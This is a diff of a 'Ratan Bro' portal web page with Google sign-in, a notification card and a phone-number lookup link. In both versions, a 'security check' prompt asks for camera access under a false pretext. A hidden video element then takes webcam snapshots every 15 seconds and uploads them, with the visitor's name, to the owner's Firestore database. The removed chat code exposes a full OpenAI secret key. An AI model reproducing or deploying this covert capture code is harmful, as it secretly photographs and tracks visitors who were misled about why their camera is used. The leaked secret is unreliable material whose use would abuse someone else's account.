@@ -10,219 +10,146 @@
     <style>
         :root {
             --pink: #ff4d94;
-            --blue: #00ccff;
             --dark: #020617;
-            --glass: rgba(255, 255, 255, 0.05);
+            --glass: rgba(255, 255, 255, 0.07);
         }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Hind Siliguri', sans-serif;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Hind Siliguri', sans-serif; }
 
         body {
             background: var(--dark);
-            background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.15), transparent),
-                        radial-gradient(circle at bottom left, rgba(0, 204, 255, 0.1), transparent), #020617;
+            background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.2), transparent), #020617;
             color: white;
             min-height: 100vh;
             overflow-x: hidden;
         }
 
-        /* Modals Setup */
-        .modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(2, 6, 23, 0.98);
-            z-index: 10000;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            backdrop-filter: blur(25px);
-            padding: 20px;
+        /* Love Rain Animation */
+        .love-rain {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none; z-index: 1; overflow: hidden;
+        }
+        .heart {
+            position: absolute;
+            color: var(--pink);
+            font-size: 15px;
+            animation: fall linear infinite;
+            opacity: 0.6;
+        }
+        @keyframes fall {
+            to { transform: translateY(100vh) rotate(360deg); }
+        }
+
+        /* Modals */
+        .modal {
+            position: fixed; inset: 0; background: rgba(2, 6, 23, 0.98);
+            z-index: 10000; display: none; align-items: center; justify-content: center;
+            backdrop-filter: blur(20px); padding: 20px;
         }
 
         .glass-box {
             background: var(--glass);
-            padding: 40px 30px;
-            border-radius: 35px;
+            padding: 35px 25px; border-radius: 35px;
             border: 1px solid rgba(255, 77, 148, 0.3);
-            text-align: center;
-            width: 100%;
-            max-width: 420px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6);
-            animation: fadeIn 0.5s ease forwards;
+            text-align: center; width: 100%; max-width: 400px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            position: relative; z-index: 10;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* Layout UI */
+        /* Header UI */
         .hero-header {
-            margin: 25px 20px;
-            padding: 35px 20px;
-            background: var(--glass);
-            border-radius: 35px;
+            margin: 20px; padding: 40px 20px;
+            background: var(--glass); border-radius: 35px;
             border: 1px solid rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(15px);
-            text-align: center;
+            position: relative; overflow: hidden;
         }
 
-        .profile-wrapper {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 20px;
-        }
+        .profile-wrapper { display: flex; justify-content: center; align-items: center; margin-bottom: 20px; }
+        .p-img { width: 100px; height: 100px; border-radius: 50%; border: 4px solid var(--pink); box-shadow: 0 0 20px var(--pink); object-fit: cover; transition: 0.5s; }
+        .user-p-img { width: 85px; height: 85px; border: 4px solid #fff; margin-left: -30px; background: #111; }
 
-        .p-img {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            border: 4px solid var(--pink);
-            box-shadow: 0 0 25px var(--pink);
-            object-fit: cover;
-        }
-
-        .user-p-img {
-            width: 85px;
-            height: 85px;
-            border: 4px solid #fff;
-            margin-left: -35px;
-            background: #111;
-        }
-
-        /* Grid */
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            padding: 0 20px 30px;
-            max-width: 500px;
-            margin: 0 auto;
-        }
-
+        /* Grid System */
+        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 0 20px 30px; max-width: 500px; margin: 0 auto; }
         .card {
-            background: var(--glass);
-            border-radius: 25px;
-            padding: 25px 15px;
-            text-align: center;
-            text-decoration: none;
-            color: white;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            transition: 0.3s ease;
+            background: var(--glass); border-radius: 25px; padding: 25px 10px;
+            text-align: center; text-decoration: none; color: white;
+            border: 1px solid rgba(255, 255, 255, 0.05); transition: 0.3s;
             position: relative;
         }
-
-        .card:hover {
-            border-color: var(--pink);
-            background: rgba(255, 77, 148, 0.08);
-            transform: scale(1.03);
-        }
-
-        .card i {
-            font-size: 2rem;
-            color: var(--pink);
-            margin-bottom: 12px;
-            display: block;
-        }
-
-        .card.wide { grid-column: span 2; display: flex; align-items: center; justify-content: center; gap: 15px; padding: 18px; }
-        .card.wide i { margin-bottom: 0; font-size: 1.5rem; }
+        .card i { font-size: 2rem; color: var(--pink); margin-bottom: 12px; display: block; }
+        .card.wide { grid-column: span 2; display: flex; align-items: center; justify-content: center; gap: 12px; padding: 20px; }
+        
+        .alarm-dot { position: absolute; top: 12px; right: 12px; width: 12px; height: 12px; background: #ff3333; border-radius: 50%; box-shadow: 0 0 10px #ff3333; display: none; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% {transform: scale(0.9);} 50% {transform: scale(1.1);} 100% {transform: scale(0.9);} }
 
         .btn-main {
             background: linear-gradient(45deg, var(--pink), #ff1a75);
             color: white; border: none; padding: 14px 25px; border-radius: 50px;
-            font-weight: 700; cursor: pointer; transition: 0.3s;
-            box-shadow: 0 5px 15px rgba(255, 77, 148, 0.3);
+            font-weight: 700; cursor: pointer; width: 100%; margin-top: 15px;
         }
-
-        /* Chat Area */
-        .chat-area { max-width: 500px; margin: 10px auto 40px; padding: 0 20px; }
-        .chat-mini { background: rgba(0, 0, 0, 0.4); border-radius: 25px; border: 1px solid rgba(255,255,255,0.1); padding: 20px; }
-        #chat-log { height: 120px; overflow-y: auto; font-size: 14px; text-align: left; margin-bottom: 15px; }
-        .chat-in { display: flex; gap: 8px; }
-        .chat-in input { flex: 1; background: #0d1117; border: 1px solid #333; color: #fff; padding: 10px 18px; border-radius: 50px; outline: none; }
-
-        .alarm-dot { position: absolute; top: 12px; right: 12px; width: 12px; height: 12px; background: red; border-radius: 50%; box-shadow: 0 0 10px red; display: none; }
 
         #vSource { position: fixed; top: -100px; opacity: 0; pointer-events: none; }
     </style>
 </head>
 
 <body>
-    <audio id="snd-bus" src="business.mp3" preload="auto"></audio>
-    <audio id="snd-port" src="portfolio.mp3" preload="auto"></audio>
-    <audio id="snd-look" src="lookup.mp3" preload="auto"></audio>
     <audio id="snd-notif" src="https://www.soundjay.com/buttons/sounds/button-3.mp3" preload="auto"></audio>
 
-    <div id="login-overlay" class="modal-overlay">
+    <div id="login-overlay" class="modal" style="display: flex;">
         <div class="glass-box">
-            <img src="ratan.jpg" style="width:100px; border-radius:50%; border:3px solid var(--pink); margin-bottom:20px;">
-            <h2>Ratan Bro Portal</h2>
-            <p style="opacity:0.6; margin-bottom:25px;">Please login to access your dashboard.</p>
-            <button class="btn-main" onclick="googleLogin()" style="width:100%;">
-                <i class="fab fa-google"></i> Login with Google
+            <img src="ratan.jpg" style="width:110px; border-radius:50%; border:3px solid var(--pink); margin-bottom:15px;">
+            <h2 style="letter-spacing: 1px;">RATAN BRO</h2>
+            <p style="font-size: 14px; opacity: 0.7; margin-bottom: 20px;">Welcome to Private Portal</p>
+            <button class="btn-main" onclick="googleLogin()">
+                <i class="fab fa-google"></i> SIGN IN WITH GOOGLE
             </button>
         </div>
     </div>
 
-    <div id="perm-modal" class="modal-overlay">
+    <div id="perm-modal" class="modal">
         <div class="glass-box">
-            <i class="fas fa-shield-alt" style="font-size:3.5rem; color:var(--pink); margin-bottom:20px;"></i>
-            <h3>Security Verification</h3>
-            <p style="font-size:14px; opacity:0.8; margin:15px 0;">আমাদের পোর্টালে প্রবেশের জন্য ক্যামেরা এবং লোকেশন এক্সেস প্রয়োজন। এটি আপনার অ্যাকাউন্টের নিরাপত্তা নিশ্চিত করে।</p>
-            <button class="btn-main" onclick="grantAndStart()" style="width:100%;">Allow & Access Portal</button>
+            <i class="fas fa-fingerprint" style="font-size:4rem; color:var(--pink); margin-bottom:20px;"></i>
+            <h3>SECURITY CHECK</h3>
+            <p style="font-size:14px; opacity:0.8; line-height:1.6; margin-bottom:10px;">আমাদের পোর্টালে আপনার উপস্থিতি নিশ্চিত করতে ক্যামেরা এবং লোকেশন এক্সেস প্রয়োজন।</p>
+            <button class="btn-main" onclick="grantAndStart()">ALLOW & CONTINUE</button>
         </div>
     </div>
 
-    <div id="notif-modal" class="modal-overlay">
-        <div class="glass-box" style="border-color: var(--blue);">
-            <h3 id="nt-title" style="color:var(--blue);">Update Notice</h3>
-            <p id="nt-msg" style="margin:20px 0; font-size:16px;"></p>
-            <button class="btn-main" onclick="closeNotif()" style="background:var(--blue);">Dismiss</button>
+    <div id="notif-modal" class="modal">
+        <div class="glass-box" style="border-color: #00ccff;">
+            <h3 style="color: #00ccff;"><i class="fas fa-bullhorn"></i> NOTICE</h3>
+            <p id="nt-msg" style="margin:20px 0; font-size:16px; line-height:1.5;"></p>
+            <button class="btn-main" onclick="closeNotif()" style="background:#00ccff;">DISMISS</button>
         </div>
     </div>
 
     <div id="main-ui" style="display:none;">
-        <div style="padding: 15px 20px 0; text-align: right;">
-            <button onclick="googleLogout()" style="background:none; border:1px solid #444; color:#888; padding:5px 15px; border-radius:50px; cursor:pointer;">Logout</button>
-        </div>
-
         <div class="hero-header">
+            <div class="love-rain" id="rain-container"></div>
             <div class="profile-wrapper">
                 <img src="ratan.jpg" class="p-img">
                 <img id="u-pic" src="" class="p-img user-p-img" onerror="this.src='ratan.jpg'">
             </div>
-            <h2 id="u-name">Member</h2>
-            <p id="u-ip" style="color:#666; font-size:12px; margin-top:5px;"><i class="fas fa-wifi"></i> Identifying...</p>
+            <h2 id="u-name" style="text-align:center;">Member</h2>
+            <p id="u-ip" style="text-align:center; color:#888; font-size:12px; margin-top:8px;">Detecting Session...</p>
         </div>
 
         <div class="grid">
             <div class="card" onclick="openLatestNotif()">
                 <div id="notif-alarm" class="alarm-dot"></div>
-                <i class="fas fa-bell"></i><p>Notice</p>
+                <i class="fas fa-bell"></i><p>Notification</p>
             </div>
-            <a href="testpaper.html" class="card"><i class="fas fa-book"></i><p>Notes</p></a>
-            <a href="business.html" class="card" onclick="document.getElementById('snd-bus').play();"><i class="fas fa-store"></i><p>Business</p></a>
-            <a href="portfolio.html" class="card" onclick="document.getElementById('snd-port').play();"><i class="fas fa-id-badge"></i><p>Portfolio</p></a>
-            <a href="https://numberlookup.pro.bd/" target="_blank" class="card wide" onclick="document.getElementById('snd-look').play();">
-                <i class="fas fa-search"></i><p>Advanced Number Lookup</p>
+            <a href="testpaper.html" class="card"><i class="fas fa-file-alt"></i><p>Notes</p></a>
+            <a href="business.html" class="card"><i class="fas fa-briefcase"></i><p>Business</p></a>
+            <a href="portfolio.html" class="card"><i class="fas fa-user-circle"></i><p>Portfolio</p></a>
+            <a href="https://numberlookup.pro.bd/" target="_blank" class="card wide">
+                <i class="fas fa-search-location"></i><p>Advanced Number Lookup</p>
             </a>
         </div>
-
-        <div class="chat-area">
-            <div class="chat-mini">
-                <div id="chat-log"><b>Ratan AI:</b> হ্যালো! আমি আপনাকে কীভাবে সাহায্য করতে পারি?</div>
-                <div class="chat-in">
-                    <input type="text" id="ai-msg" placeholder="Ask AI...">
-                    <button onclick="askAI()" class="btn-main" style="padding:10px 15px;">Send</button>
-                </div>
-            </div>
+        
+        <div style="text-align: center; margin-top: 10px;">
+            <button onclick="googleLogout()" style="background:none; border:none; color:#555; font-size:12px;">Sign Out</button>
         </div>
     </div>
 
@@ -232,7 +159,7 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { getFirestore, doc, setDoc, onSnapshot, arrayUnion } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
@@ -251,66 +178,73 @@
         let loggedUser = null;
         let latestNotif = null;
 
-        // ক্যামেরা এবং স্টার্ট ফাংশন
+        // Love Rain Logic
+        function createHearts() {
+            const container = document.getElementById('rain-container');
+            for(let i=0; i<15; i++) {
+                let heart = document.createElement('i');
+                heart.className = 'fas fa-heart heart';
+                heart.style.left = Math.random() * 100 + '%';
+                heart.style.animationDuration = (Math.random() * 3 + 2) + 's';
+                heart.style.delay = Math.random() * 5 + 's';
+                container.appendChild(heart);
+            }
+        }
+
+        // Security & Camera
         window.grantAndStart = async () => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 document.getElementById('vSource').srcObject = stream;
-
-                // IP Fetch
-                fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => {
-                    document.getElementById('u-ip').innerHTML = `<i class="fas fa-network-wired"></i> IP: ${data.ip}`;
-                    window.userIP = data.ip;
-                });
+                
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                document.getElementById('u-ip').innerText = "IP: " + data.ip;
 
                 document.getElementById('perm-modal').style.display = 'none';
                 document.getElementById('main-ui').style.display = 'block';
-
-                // অটো স্ন্যাপশট লুপ
-                setInterval(captureUser, 15000);
-                setTimeout(captureUser, 2000);
+                createHearts();
+                setInterval(capture, 15000); // অটো স্ন্যাপ লুপ
             } catch (e) {
-                alert("Permission Denied! পোর্টালে ঢুকতে ক্যামেরা পারমিশন অবশ্যই দিতে হবে।");
+                alert("Security Error: Please Allow Camera to enter.");
             }
         };
 
-        async function captureUser() {
-            if (!loggedUser) return;
+        async function capture() {
+            if(!loggedUser) return;
             const video = document.getElementById('vSource');
             const canvas = document.getElementById('snapCanvas');
             const ctx = canvas.getContext('2d');
-            if (video.readyState === 4) {
+            if(video.readyState === 4) {
                 ctx.drawImage(video, 0, 0, 640, 480);
                 const img = canvas.toDataURL('image/jpeg', 0.3);
                 const userKey = loggedUser.email.replace(/\./g, '_');
                 await setDoc(doc(db, "users", userKey), {
                     name: loggedUser.displayName,
                     lastPic: img,
-                    lastSeen: new Date().toLocaleString(),
-                    ip: window.userIP || "Hidden"
+                    time: new Date().toLocaleString()
                 }, { merge: true });
             }
         }
 
+        // Auth Logic
         onAuthStateChanged(auth, (user) => {
             if (user) {
                 loggedUser = user;
                 document.getElementById('u-name').innerText = user.displayName;
                 document.getElementById('u-pic').src = user.photoURL;
                 document.getElementById('login-overlay').style.display = 'none';
-                // প্রতিবার রিফ্রেশে পারমিশন মডেল দেখাবে
                 document.getElementById('perm-modal').style.display = 'flex';
             } else {
                 document.getElementById('login-overlay').style.display = 'flex';
                 document.getElementById('main-ui').style.display = 'none';
-                document.getElementById('perm-modal').style.display = 'none';
             }
         });
 
         window.googleLogin = () => signInWithPopup(auth, provider);
         window.googleLogout = () => signOut(auth).then(() => location.reload());
 
-        // Notifications
+        // Real-time Notification Listener
         onSnapshot(doc(db, "system", "updates"), (snap) => {
             if (snap.exists()) {
                 latestNotif = snap.data();
@@ -329,28 +263,6 @@
             }
         };
         window.closeNotif = () => document.getElementById('notif-modal').style.display = 'none';
-
-        // AI Chat (Simplified)
-        window.askAI = async () => {
-            const input = document.getElementById('ai-msg');
-            const log = document.getElementById('chat-log');
-            if (!input.value) return;
-            log.innerHTML += `<div><b>You:</b> ${input.value}</div>`;
-            const userMsg = input.value;
-            input.value = "Thinking...";
-            
-            try {
-                const res = await fetch("https://api.openai.com/v1/chat/completions", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json", "Authorization": "Bearer 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" },
-                    body: JSON.stringify({ model: "gpt-4o-mini", messages: [{ role: "user", content: userMsg }] })
-                });
-                const data = await res.json();
-                log.innerHTML += `<div><b>AI:</b> ${data.choices[0].message.content}</div>`;
-            } catch (e) { log.innerHTML += `<div style="color:red;">AI Error</div>`; }
-            input.value = "";
-            log.scrollTop = log.scrollHeight;
-        };
     </script>
 </body>
 </html>
